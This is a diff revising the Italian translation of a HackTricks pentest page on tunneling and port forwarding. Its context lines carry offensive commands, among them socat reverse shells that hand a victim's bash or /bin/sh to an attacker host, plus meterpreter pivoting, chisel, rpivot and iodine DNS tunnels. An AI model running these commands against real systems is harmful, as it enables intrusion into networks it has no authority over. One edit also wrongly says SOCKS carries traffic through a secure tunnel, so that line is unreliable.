@@ -2,9 +2,9 @@
 
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
 
-* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
@@ -14,7 +14,7 @@
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -23,7 +23,7 @@
 ## Suggerimento Nmap
 
 {% hint style="warning" %}
-Gli scansione **ICMP** e **SYN** non possono essere tunnelati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta del ping** (`-Pn`) e specificare **scansioni TCP** (`-sT`) affinché funzioni.
+**ICMP** e **scansioni SYN** non possono essere tunnelate attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta del ping** (`-Pn`) e specificare **scansioni TCP** (`-sT`) affinché funzioni.
 {% endhint %}
 
 ## **Bash**
@@ -50,7 +50,7 @@ Connessione grafica SSH (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
-### Porta Locale2Locale
+### Porta Locale a Porta
 
 Aprire una nuova porta nel server SSH --> Altra porta
 ```bash
@@ -108,7 +108,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Puoi **tunnel** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
+Puoi **tunnel**are tutto il **traffico** verso una **sottorete** tramite un host **ssh**.\
 Per esempio, inoltrando tutto il traffico diretto a 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -130,7 +130,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) è un protocollo di rete che permette il tunneling di connessioni di rete attraverso un firewall. SOCKS funziona come un proxy server che inoltra il traffico di rete tra il client e il server. È ampiamente utilizzato per garantire l'anonimato e la privacy su Internet.
+SOCKS (Socket Secure) è un protocollo di rete che permette il tunneling di connessioni di rete attraverso un firewall. SOCKS funziona come un proxy server che instrada il traffico di rete tra il client e il server attraverso un tunnel sicuro. Questo protocollo è ampiamente utilizzato per bypassare restrizioni di rete e garantire la privacy e l'anonimato durante la navigazione su Internet.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -138,7 +138,7 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-Un altro modo:
+Un altro modo per ottenere un accesso remoto a una rete interna è utilizzare il tunneling e l'inoltro delle porte. Questa tecnica coinvolge l'invio del traffico di rete attraverso un tunnel crittografato per aggirare le restrizioni di rete e raggiungere risorse interne. Può essere implementata utilizzando strumenti come **SSH** o **VPN** per creare un canale sicuro tra il dispositivo dell'attaccante e la rete di destinazione. Una volta stabilita la connessione, l'attaccante può utilizzare l'inoltro delle porte per instradare il traffico attraverso il tunnel e accedere alle risorse interne della rete bersaglio.
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -166,7 +166,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-In questo caso, la **porta viene aperta nell'host beacon**, non nel Server del Team e il traffico viene inviato al Server del Team e da lì all'host:porta indicato.
+In questo caso, la **porta è aperta nell'host beacon**, non nel Server del Team e il traffico viene inviato al Server del Team e da lì all'host:porta indicato.
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -192,7 +192,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Puoi scaricarlo dalla pagina dei rilasci di [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-È necessario utilizzare la **stessa versione per client e server**
+È necessario utilizzare **la stessa versione per client e server**
 
 ### socks
 ```bash
@@ -221,7 +221,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Attraversare il **proxy NTLM**
+Attraversare tramite **proxy NTLM**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -243,7 +243,7 @@ attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
-### Porta a Porta
+### Da Porta a Porta
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
@@ -285,7 +285,7 @@ chmod 600 $FILENAME.key $FILENAME.pem
 attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
-### Porta2Port Remoto
+### Porta2Porta Remoto
 
 Collega la porta SSH locale (22) alla porta 443 dell'host dell'attaccante
 ```bash
@@ -321,15 +321,15 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 È necessario avere **accesso RDP sul sistema**.\
 Scarica:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza i `Dynamic Virtual Channels` (`DVC`) dalla funzionalità di servizio Desktop remoto di Windows. DVC è responsabile del **tunneling dei pacchetti sulla connessione RDP**.
-2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
+1. [Binari x64 di SocksOverRDP](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza i `Dynamic Virtual Channels` (`DVC`) dalla funzionalità di servizio Desktop remoto di Windows. DVC è responsabile del **tunneling dei pacchetti sulla connessione RDP**.
+2. [Binario portatile di Proxifier](https://www.proxifier.com/download/#win-tab)
 
 Nel computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **prompt** che indica che il plugin **SocksOverRDP è abilitato**, e che sarà in **ascolto** su **127.0.0.1:1080**.
+Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **prompt** che indica che il **plugin SocksOverRDP è abilitato**, e che sarà in **ascolto** su **127.0.0.1:1080**.
 
 **Connettiti** tramite **RDP** e carica ed esegui nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
 ```
@@ -341,10 +341,10 @@ netstat -antb | findstr 1080
 ```
 Ora puoi utilizzare [**Proxifier**](https://www.proxifier.com/) **per instradare il traffico attraverso quella porta.**
 
-## Proxificare le App GUI di Windows
+## Proxify Applicazioni GUI di Windows
 
-Puoi fare in modo che le app GUI di Windows navighino attraverso un proxy utilizzando [**Proxifier**](https://www.proxifier.com/).\
-In **Profilo -> Server Proxy** aggiungi l'IP e la porta del server SOCKS.\
+Puoi fare in modo che le applicazioni GUI di Windows navighino attraverso un proxy utilizzando [**Proxifier**](https://www.proxifier.com/).\
+In **Profilo -> Server Proxy** aggiungi l IP e la porta del server SOCKS.\
 In **Profilo -> Regole di Proxificazione** aggiungi il nome del programma da proxificare e le connessioni agli IP che desideri proxificare.
 
 ## Bypass del proxy NTLM
@@ -358,7 +358,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Autentica contro un proxy e associa in locale una porta che viene inoltrata al servizio esterno che specificate. Successivamente, potete utilizzare lo strumento che preferite attraverso questa porta.\
+Autentica contro un proxy e associa localmente una porta che viene inoltrata al servizio esterno che specificate. Successivamente, potete utilizzare lo strumento che preferite attraverso questa porta.\
 Per esempio, inoltra la porta 443
 ```
 Username Alice
@@ -380,7 +380,7 @@ Un proxy inverso creato da Microsoft. Puoi trovarlo qui: [https://github.com/mic
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-È necessario avere i permessi di root in entrambi i sistemi per creare adattatori tun e tunnelare i dati tra di essi utilizzando le query DNS.
+È necessario avere i permessi di root in entrambi i sistemi per creare adattatori tun e tunnel dati tra di essi utilizzando le query DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -417,7 +417,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Cambiare il DNS di proxychains
 
-Proxychains intercetta la chiamata libc `gethostbyname` e instrada la richiesta tcp DNS attraverso il proxy socks. Per **default**, il server **DNS** che utilizza proxychains è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'IP. Se ti trovi in un ambiente **Windows**, puoi impostare l'IP del **domain controller**.
+Proxychains intercetta la chiamata libc `gethostbyname` e instrada la richiesta DNS tcp attraverso il proxy socks. Per **default**, il server **DNS** che utilizza proxychains è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'IP. Se ti trovi in un ambiente **Windows**, puoi impostare l'IP del **domain controller**.
 
 ## Tunnel in Go
 
@@ -459,7 +459,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 
 ### Installazione
 
-- Creare un account: https://ngrok.com/signup
+- Crea un account: https://ngrok.com/signup
 - Download del client:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
@@ -522,7 +522,7 @@ addr: file:///tmp/httpbin/
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -532,8 +532,8 @@ addr: file:///tmp/httpbin/
 
 <summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la **tua azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
